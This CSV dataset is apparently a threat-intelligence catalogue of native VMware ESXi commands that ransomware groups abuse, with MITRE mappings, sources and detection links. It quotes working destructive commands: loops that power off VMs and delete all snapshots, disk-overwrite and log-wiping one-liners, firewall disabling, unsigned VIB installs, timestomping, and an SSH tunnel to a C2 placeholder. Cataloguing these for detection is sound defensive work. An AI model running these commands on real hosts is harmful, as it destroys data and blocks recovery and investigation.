"Name"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_E-Crime","Full_Path","Full_Path_Path","Resources","Resources_Link","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_ProceduralExamples","Detection","Detection_Elastic","AtomicTests","Commands_ProcedureExamples","Detection_Sigma","Code_Sample","Code_Sample_Code","Commands_Tags_APT","is_legit"
"vpxa","Vpxa functions as an intermediary service that connects the vpxd service on the vCenter Server with the hostd service on an ESXi host. Stopping this service will cause management and monitoring functions to cease.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","/etc/init.d/vpxa stop","Stops the vpxa service on an ESXi host.","An adversay may stop the vpxa service to cease remote management by the VCenter server.","Stop Service","Administrator","T1489","ESXi","","Nevada","","/etc/init.d/vpxa","","https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/","","[''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","","","","","","","","","","false"
"vmkfstools","A command-line utility in VMware ESXi used to manage and interact with VMFS (Virtual Machine File System) volumes.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null","Create eager-zeroed thick virtual disk at the specified location without displaying any output.","Adversary uses vmfstools to create and immediately delete a 10MB eager zeroed thick disk on every datastore on the ESXi host. This will effectively overwrite contents of the disk.","Inhibit Recovery","Administrator","T1561.001","ESXi","","Qilin","","[''/sbin/vmkfstools''-|-''/bin/vmkfstools'']","","[''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.shadowstackre.com/analysis/qilin'']","","[''Lawrence Abrams''-|-''MalwareHunterTeam'']","@malwarehunterteam","[''for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done''-|-''for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done'']","","","","","","","","","false"
"vm-support","A command-line utility in VMware ESXi that collects diagnostic information for troubleshooting and support purposes.","Janantha Marasinghe @blueteam0ps_","2024-08-30","","vm-support --listvms","Lists running Virtual Machines","Obtains a list of running Virtual Machines","Lists VMs","Administrator","T1082","ESXi","","Lockbit","","[''/sbin/vm-support''-|-''/bin/vm-support'']","","https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html","","Junestherry Dela Cruz","","","","","","","","","","","false"
"vim-cmd","A command-line utility in VMware ESXi that provides an interface to interact with the VMware Infrastructure (VI) API, allowing users to manage and automate tasks on ESXi host and its virtual machines (VMs)","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''vim-cmd hostsvc/enable_ssh''-|-''vim-cmd hostsvc/autostartmanager/enable_autostart false''-|-''vim-cmd hostsvc/hostsummary | grep cpuModel''-|-''vim-cmd vmsvc/getallvms''-|-''vim-cmd vmsvc/snapshot.removeall''-|-''vim-cmd vmsvc/power.off'']","[''Enables SSH services on the ESXi host''-|-''Disable autostart of Virtual Machines''-|-''Displays summary of system information about the ESXi host''-|-''Displays the list of VMs available on an ESXi host.''-|-''Remove VM Snapshots''-|-''Power off VM'']","[''SSH service enables adversaries to laterally move to ESXi hosts and use as an alternative command execution interface.''-|-''Disabling autostart of Virtual Machines prevents them from starting post reboot of a ESXi host.''-|-''Shows the exact cpuModel from the hostsummary output''-|-''Shows running VMs on an ESXi Host. Adversaries were seen use this techinique to programatically enumerate VMs and powers them down using the Vmid.''-|-''Deletes all snapshots of all Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.''-|-''Powers off Virtual Machines. This activity is usually observed near ransomware deployment and is often executed programatically.'']","[''Enable Service''-|-''Disable Startup''-|-''System Information''-|-''System Information''-|-''Inhibit Recovery''-|-''Power off VM'']","[''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator'']","[''T1021.004''-|-''T1529''-|-''T1082''-|-''T1082''-|-''T1485''-|-''T1529'']","[''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi'']","","[''Lockbit''-|-''Ransomhub''-|-''Blackcat''-|-''Qilin''-|-''Play''-|-''Lynx''-|-''Howling Scorpius'']","","[''/sbin/vim-cmd''-|-''/bin/vim-cmd'']","","[''https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html''-|-''https://thedxt.ca/2023/12/esxi-autostart-vms-with-cli/''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-ransomhub-ransomware-targets-vmware-esxi-vms/''-|-''https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.trendmicro.com/en_us/research/24/g/new-play-ransomware-linux-variant-targets-esxi-shows-ties-with-p.html''-|-''https://x.com/malwrhunterteam/status/1455628865229950979?lang=en''-|-''https://www.hybrid-analysis.com/sample/a0ceb258924ef004fa4efeef4bc0a86012afdb858e855ed14f1bbd31ca2e42f5/661430861522cb62560ee827''-|-''https://unit42.paloaltonetworks.com/inc-ransomware-rebrand-to-lynx/''-|-''https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/''-|-''https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/'']","","[''Junestherry Dela Cruz''-|-''Daniel Keer''-|-''Tom Fakterman''-|-''Ohav Peri''-|-''MalwareHunterTeam''-|-''Cj Arsley Mateo''-|-''Darrel Tristan Virtusio''-|-''Sarah Pearl Camiling''-|-''Andrei Alimboyao''-|-''Nathaniel Morales''-|-''Jacob Santos''-|-''Earl John Bareng''-|-''Pranay Kumar Chhaparwal''-|-''Micah Yates''-|-''Benjamin Chang''-|-''Yoav Zemah'']","[''@thedxt''-|-''@malwrhunterteam'']","[''vim-cmd hostsvc/autostartmanager/enable_autostart 0''-|-''/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done""''-|-''for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;''-|-''vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system(""vim-cmd vmsvc/power.off "" $1)}''-|-''for i in `vim-cmd vmsvc/getallvms| awk '{print$1}'`;do vim-cmd vmsvc/snapshot.removeall $i & done''-|-''vim-cmd vmsvc/snapshot.removeall %llu > /dev/null 2>&1''-|-''vim-cmd vmsvc/getallvms | grep -o -E \'^[0-9]+\' | xargs -r -n 1 vim-cmd vmsvc/power.off''-|-''/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done""''-|-''for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;''-|-''vim-cmd vmsvc/getallvms | tail -n +2 | awk '{system(""vim-cmd vmsvc/power.off "" $1)}'']","","","","","","","","","false"
"ulimit","A command line utility used to control the resource limits available to the shell and processes started by it. These limits are designed to prevent a single user or process from using high number of system resources, which could negatively impact the entire system.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","ulimit -p $(ulimit -Hp) ulimit -n $(ulimit -Hn)","Changes the open file descriptor and pseudoterminals to unlimited.","An adversary modifies the resource limit thresholds to unlimited. This allows a single process to utilise all the system resources.","Adjust Performance","Administrator","","ESXi","","Nevada","","","","https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire","","Jason Hill","","","","","","","","","","","false"
"touch","Primarily used to create an empty file or to update the timestamp (modification and access time) of an existing file without changing its content.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh","Changes modification or access timestamps of a target file based on a reference file.","An adversary uses the modification and access timestamps of a references file and updates the same timestampts of a target file. This is to hinder analysis based on timestamps as the malicious file match the timestamps of a legitimate file.","Timestomp","Administrator","T1070.006","ESXi","","Nevada","","[''/sbin/touch''-|-''/bin/touch''-|-''/usr/lib/vmware/busybox/bin/busybox touch'']","","[''https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire'']","","Jason Hill","","[''/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/vmware/rhttpproxy/endpoints.conf''-|-''/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /var/spool/cron/crontabs/root''-|-''/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /bin/hostd-probe.sh'']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_esxi_suspicious_timestomp_touch.toml","","","","","","","false"
"systemctl","Manages the status of system services","Janantha Marasinghe @blueteam0ps_","2024-08-27","","service $s stop","Stops all services on an ESXi host.","An adversary stops all services within the ESXi host to prevent any interference with ransomware encryption operations.","Stop Service","Administrator","T1529","ESXi","","GwisinLocker","","/sbin/services.sh","","[''https://www.hybrid-analysis.com/sample/7594bf1d87d35b489545e283ef1785bb2e04637cc1ff1aca9b666dde70528e2b/6310d9bdbde3430a5a65372f''-|-''https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies'']","","Joseph Edwards","","/usr/local/etc/r/etc/init.d/%s* systemctl stop %/sbin/service %s/bin/sh -c ""for s in `service -l | grep %s`; do service $s stop;","","","","","","","","","false"
"ssh","Inbuilt SSH client used to remote port-forward using a tunnel.","Janantha Marasinghe @blueteam0ps_","2025-01-24","","ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>","SSH client used to create a tunnel.","An adversary uses the native SSH binary to create a tunnel to remote port-forwarding to their C2 host.","Tunnel Traffic","User","T1572","ESXi","","","","[''/bin/ssh''-|-''/sbin/ssh'']","","https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/","","[''Ren Jie Yow''-|-''Zhongyuan Hau (Aaron)'']","","ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>","","","","","","","","","false"
"pkill","Forcefully terminates processes by performing a full or partial match based on the process name. It is commonly exploited by adversaries to abruptly stop running Virtual Machine (VM) executable processes. This is usually performed prior to ransomware deployment.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","pkill -9 %s","Terminates all processes starts with the vmx- prefix.","Forceful termination of Virtual Machines","terminate process","Administrator","T1489","ESXi","","Revil","","[''/bin/vmkvsitools pkill''-|-''/sbin/pkill''-|-''/bin/pkill'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.forescout.com/resources/rise-in-linux-ransomware/''-|-''https://www.hybrid-analysis.com/sample/ea1872b2835128e3cb49a0bc27e4727ca33c4e6eba1e80422db19b505f965bc4/60db1f3adc8afe020254a5f3'']","","Michael Dawson","","pkill -9 vmx-*","","","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-13---esxi---terminates-vms-using-pkill","","","","","","false"
"mv","Used for moving or renaming files/folders within a file system.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","mv /etc/motd /etc/motd1","Renames the Message Of The Day file.","An adversary renames the current motd file on an ESXi host and copies a custom version to its location. This usually contain the ransom notification.","Replace File","Administrator","T1491","ESXi","","Nevada","","[''/usr/lib/vmware/busybox/bin/busybox mv''-|-''/sbin/mv''-|-''/bin/mv'']","","https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire","","Jason Hill","","","","","","mv /etc/motd /etc/motd1 && cp $CLEAN_DIR/motd /etc/motd","","","","","false"
"kill","Allows manual termination of processes of interest.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","kill -9 {process}","Terminates processes on an ESXi Host","An adversary may list processes starting with vmx and then extracts the second column from the output and uses it to terminate the process. Further, research indicates that adversaries enumerate ssh sessions by non-root users and sends a kill signal 9 to terminate them. This ceases ssh sessions initiated by legitimate users and allows the adversary to operate further using root user account.","Terminate Process","Administrator","T1489","ESXi","","[''RansomHouse''-|-''Nevada'']","","[''/usr/lib/vmware/busybox/bin/busybox kill''-|-''/sbin/kill''-|-''/bin/kill'']","","[''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/'']","","[''Jason Hill''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","[''kill -9 $(ps | grep vmx | awk '{print $2}')''-|-''ps | grep sshd | grep -v -e grep -e root -e 12345 | awk {print ""kill -9"", $2} | sh'']","","","","","https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml","","","","false"
"find","A commandline utility that can be used to locate files and directories based on various criteria, such as name, type, size, modification date, etc.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''find /vmfs/volumes/ -type f -name ""*.vmdk""''-|-''/bin/find / -name *.log -exec /bin/rm -rf {} \;''-|-''find /usr/lib/vmware -type f -name index.html'']","[''Locates files with extensions commonly associated with Virtual Machines, such as .vmdk and .vmx within /vmfs/volumes folder path. This may be performed programmatically and additional switches can be used to exclude specific folders from the search.''-|-''Find and delete all files ending with .log extension''-|-''Find and replace the ESXi web console homepage.'']","[''Locate virtual machine disks in preparation for encryption operations or for exfiltration.''-|-''An adversary deletes all files ending with the .log file extension to clear evidence of their offensive operations.''-|-''An adversary finds and replaces the ESXi web console homepage with a custom version. This often contains ransomware notification message.'']","[''Find Files''-|-''Remove Evidence''-|-''Find and Replace'']","[''Administrator''-|-''User''-|-''User'']","[''T1083''-|-''T1070.004''-|-''T1491.001'']","[''ESXi''-|-''ESXi''-|-''ESXi'']","","[''RansomHouse''-|-''Nevada'']","","[''/usr/lib/vmware/busybox/bin/busybox find''-|-''/sbin/find''-|-''/bin/find'']","","[''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/'']","","[''Jason Hill''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","[''- find ""/vmfs/volumes/$volume/"" -type f -name ""*.vmdk"" -o -name ""*.vmx"" -o -name ""*.vmxf"" -o -name ""*.vmsd"" -o -name ""*.vmsn"" -o -name ""*.vswp"" -o -name ""*.vmss"" -o -name ""*.nvram"" -o -name ""*.vmem"" - find /vmfs/volumes/ -type f -not \( -path /sys -prune \) -not \( -path /proc -prune \)   -not \( -path /run -prune \) -not \( -path /var/log -prune \) -name ""*.vmdk*"" -o -name ""*.ovf*"" -o -name ""*.ova*"" -o -name ""*.vmem*"" -o -name ""*.vswp*"" -o -name ""*.vmsd*"" -o -name ""*.vmsn*"" -o -name ""*.vib*"" -o -name ""*.vbk*"" -o -name ""*.vbm*"" ''-|-''/bin/find / -name *.log -exec /bin/rm -rf {} \;''-|-''- find /usr/lib/vmware -type f -name index.html mv ""$path_to_ui/index.html"" ""$path_to_ui/index1.html cp ""$CLEAN_DIR/index.html"" ""$path_to_ui/index.html""  '']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_rename_esxi_index_file.toml","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md#atomic-test-7---esxi---enumerate-vmdks-available-on-an-esxi-host","","","","None","","false"
"esxcli","esxcli is a command-line interface (CLI) tool (which is a python script) used to manage VMware ESXi hosts. Using esxcli, administrators can perform various tasks related to ESXi host management, including network configuration, storage management, and VM operations.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''esxcli --formatter=csv --format-param=fields==""WorldID,DisplayName"" vm process list''-|-''esxcli vm process kill --type=force --world-id=796791''-|-''esxcli system version get''-|-''esxcli system hostname get''-|-''esxcli system account list''-|-''esxcli storage filesystem list''-|-''/bin/sh -c ""esxcli system welcomemsg set -m=""""''-|-''esxcli network firewall set --enabled false''-|-''esxcli network firewall set --default-action true''-|-''esxcli vsan debug vmdk list''-|-''esxcli --format-param=fields==""Type,ObjectUUID,Configuration"" vsan debug object list''-|-''esxcli --formatter=csv --format-param=fields==""Device,DevfsPath"" storage core device list''-|-''esxcli --formatter=csv network ip interface ipv4 get''-|-''esxcli software vib install -f --no-sig-check''-|-''esxcli software acceptance set --level CommunitySupported''-|-''esxcli system syslog config set --logdir=/tmp''-|-''esxcli system coredump file set --unconfigure'']","[''Provides a CSV output of running Virtual Machines with its corresponding WorldID and DisplayName.''-|-''Terminates a Virtual Machine using its World ID.''-|-''Display the product name, version and build information.''-|-''Shows FQDN of the ESXi host.''-|-''Displays a list of local accounts in the ESXi host.''-|-''Shows all the volumes available on the ESXi host.''-|-''Changes the ESXi Welcome Message on the Direct Console User Interface (DCUI).''-|-''Disables the ESXi firewall.''-|-''Changes the ESXi firewall default action to PASS. Command is inferred based on vendor documentation, not available via CTI.''-|-''List the status of VMDKs in vSAN.''-|-''List the UUID of the vSAN objects.''-|-''List the Devfs Path of the devices currently registered with the storage.''-|-''Displays network interface details.''-|-''Install a VIB without checking the signature.''-|-''Changes the VIB acceptance level to CommunitySupported.''-|-''Changes the syslog directory using esxcli. This is followed by the command esxcli system syslog reload''-|-''Disable creation of coredumps in ESXi'']","[''Provides a list of running Virtual Machines with their WorldID and Displayname in CSV format''-|-''Force terminates a VM using the WorldID when Soft or Hard terminates options fail. Soft termination allows the guest OS to gracefully shut down.This is similar to kill-SIGTERM. Gard mode immediately terminates a Virtual Machine using its World ID. It kills the VMX process and is similar to a kill -9 command''-|-''An adversary may use this to obtain the exact build version information of the ESXi host to facilitate subsequent actions.''-|-''FQDN of the host can be used as part of infrastructure information gathering operations.''-|-''An adversary may use the list of local accounts and use them for subsequent opeations. CSV output option was selected in certain operations.''-|-''An adversary may use this command to gain visibility of different volumes attached to the ESXi host. An adversary may use this command to gain visibility of different volumes attached to the ESXi host within /vmfs/volumes folder. This location usually holds data related to VMs.''-|-''An adversary changes the welcome message on the DCUI with ransomware notification.''-|-''An adversary changes the ESXi host based firewall so it will cause minimum interference with their operations.''-|-''An adversary sets the default firewall action to allow all incoming and outgoing traffic.''-|-''An adversary carries out enumeration of storage.''-|-''An adversary carries out enumeration of storage objects.''-|-''An adversary carries out enumeration of devices connected to storage.''-|-''An adversary may obtain information regarding network interfaces available in the ESXi host.''-|-''To bypass additional validation when installing malicious VIBs, an adversary uses the force and no signature checking switches. Malicious VIBs are used to maintain persistent and command execution capability with an ESXi host and its guest VMs.''-|-''ESXi by default will require it to be signed and by default set to PartnerSupported level. An adversary may change the VIB acceptance level to CommunitySupported level prior to running VIB installation.''-|-''An adversary may change the default directory where syslog log files are written to evade detection.''-|-''An adversary may disable coredump creation to prevent diagnostic data from being generated. This is to prevent traces of their activity from being available for inspection during investigations.'']","[''Lists VMs''-|-''terminate vm''-|-''system information''-|-''system information''-|-''account enumeration''-|-''discover storage''-|-''change display information''-|-''disable service''-|-''modify service''-|-''discover storage''-|-''discover storage''-|-''discover storage''-|-''discover network info''-|-''software operation''-|-''software operation''-|-''modify logging''-|-''modify service'']","[''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator'']","[''T1082''-|-''T1489''-|-''T1082''-|-''T1082''-|-''T1087.001''-|-''T1082''-|-''T1491.001''-|-''T1562.004''-|-''T1562.004''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''T1562.012''-|-''T1562.001'']","[''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi'']","","[''PINCHY SPIDER''-|-''REvix''-|-''Rhysida''-|-''VIKING SPIDER''-|-''Ragnar Locker''-|-''RansomHouse''-|-''Darkside''-|-''Qilin''-|-''Blacksuit''-|-''ESXiArgs''-|-''Nevada''-|-''Blackcat''-|-''Royal Ransomware''-|-''Lockbit''-|-''Revil''-|-''Howling Scorpius''-|-''Helldown'']","","[''/bin/esxcli''-|-''/sbin/esxcli'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html''-|-''https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers''-|-''https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers''-|-''https://gist.githubusercontent.com/manualbashing/4955642aa81d74c3c5221a698abfe381/raw/2e7ad84449c875821b31455ae1f4193bfde8b05f/freqStunnedVMs.sh''-|-''https://www.trendmicro.com/vinfo/au/threat-encyclopedia/malware/ransom.linux.blacksuit.theodbc''-|-''https://vdc-repo.vmware.com/vmwb-repository/dcr-public/24be7af7-d9cd-48d9-bab8-8c91614be19d/0ca33108-8017-4b40-86b9-f066456894ea/doc/GUID-53C7D50E-1C8D-486D-89FF-E69B0A77E406.html''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/''-|-''https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html''-|-''https://x.com/malwrhunterteam/status/1704974867542532286/photo/3''-|-''https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass''-|-''https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence''-|-''https://blogs.vmware.com/vsphere/2011/09/whats-in-a-vib.html''-|-''https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f''-|-''https://www.forescout.com/resources/rise-in-linux-ransomware/''-|-''https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies''-|-''https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/''-|-''https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening''-|-''https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/''-|-''https://labs.yarix.com/2025/01/zyxel-vulnerability-exploited-by-helldown-ransomware-group/'']","","[''Michael Dawson''-|-''Junestherry Dela Cruz''-|-''Geri Revay''-|-''Tom Fakterman''-|-''Ohav Peri''-|-''Jason Hill''-|-''Mehardeep Singh Sawhney''-|-''Lawrence Abrams''-|-''MalwareHunterTeam''-|-''MalwareHunterTeam''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''Mina Naiim''-|-''Cj Arsley Mateo''-|-''Darrel Tristan Virtusio''-|-''Sarah Pearl Camiling''-|-''Andrei Alimboyao''-|-''Nathaniel Morales''-|-''Jacob Santos''-|-''Earl John Bareng''-|-''Alexander Marvi''-|-''Brad Slaybaugh''-|-''Ron Craft''-|-''Rufus Brown''-|-''Alexander Marvi''-|-''Jeremy Koppen''-|-''Tufail Ahmed''-|-''Jonathan Lepore''-|-''Joseph Edwards''-|-''Yoav Zemah''-|-''Claudio Vozza'']","[''@malwarehunterteam''-|-''@1ZRR4H'']","[''esxcli --formatter=csv vm process list''-|-''/bin/sh -c esxcli vm process list > list''-|-''esxcli vm process list''-|-''esxcli vm process kill –type=hard –world-id=<ID>''-|-''esxcli vm process kill -w <WID> -t soft''-|-''esxcli --formatter=csv --format-param=fields==""WorldID,DisplayName"" vm process list | awk -F ""\""*,\""*"" '{system(""esxcli vm process kill --type=force --world-id="" $1)}'''-|-''For i in ‘esxcli VM Process List | grep “World ID” | awk ‘{print $3}”; do esxcli vm process kill -t=force -w=$i;done;''-|-''esxcli --formatter=csv system account list''-|-''esxcli storage filesystem list | grep ""/vmfs/volumes/"" | awk -F'  ' '{print $2}'''-|-''esxcli network firewall set -d true''-|-''esxcli --formatter=csv network ip interface ipv4 get''-|-''/bin/sh -c 'esxcli system syslog config set --logdir=/tmp'''-|-''/bin/sh -c 'esxcli system coredump file set --unconfigure''']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/impact_esxi_process_kill.toml","[''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-31---esxi---vm-discovery-using-esxcli''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-32---esxi---darkside-system-information-discovery''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1129/T1129.md#atomic-test-1---esxi---install-a-custom-vib-on-an-esxi-host''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-14---esxi---avoslocker-enumerates-vms-and-forcefully-kills-vms''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-2---esxi---change-vib-acceptance-level-to-communitysupported-via-esxcli''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-1---esxi---change-vib-acceptance-level-to-communitysupported-via-powercli'']","","[''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_system_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_storage_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_network_discovery.yml'']","","","UNC3886","false"
"esxcfg-advcfg","A command-line utility available in VMware ESXi to manage advanced configuration settings. It allows administrators to query, modify, and manage various advanced parameters that are not typically available through the standard vSphere Client or the ESXi host client interface.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","[''esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity''-|-''esxcfg-advcfg -s 20000 /BufferCache/FlushInterval'']","[''Increases the number of buffers to increase VM performance over network.''-|-''Reduces the Buffer Cache Flush interval to increase VM performance over network.'']","[''An adversary may adjust the maximum capacity of buffer cache to increase performance of operations conducted over the network.''-|-''An adversary may adjust flush interval of buffer cache to increase performance of operations conducted over the network.'']","[''Adjust Performance''-|-''Adjust Performance'']","[''Administrator''-|-''Administrator'']","","[''ESXi < 8.0''-|-''ESXi < 8.0'']","","[''Qilin''-|-''Qilin'']","","[''/bin/esxcfg-advcfg''-|-''/sbin/esxcfg-advcfg'']","","[''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://knowledge.broadcom.com/external/article?legacyId=2052302'']","","[''Lawrence Abrams''-|-''MalwareHunterTeam'']","@malwarehunterteam","","","","","","","","","","false"
"df","Provides disk utilisation statistics of attached volumes.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","df -h -P -x""squashfs"" | awk '{print $1""\t""$2""\t""$3""\t""$4""\t""$5""\t""$6}'","Displays information regarding available storage on a ESXi host","An adversary may obtain information about existing storage availability to plan subsequent operations. Above command provides outputs available disk space in human readable format in POSIX format. It excludes the squashfs and then prints the first 6 columns from the output. Note that the -P and -x switches are not available in ESXi so the exact command may not get executed successfully.","System Information","Administrator","T1082","ESXi","","RansomHouse","","[''/bin/df''-|-''/sbin/df'']","","https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/","","[''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","","","","","","","","","","false"
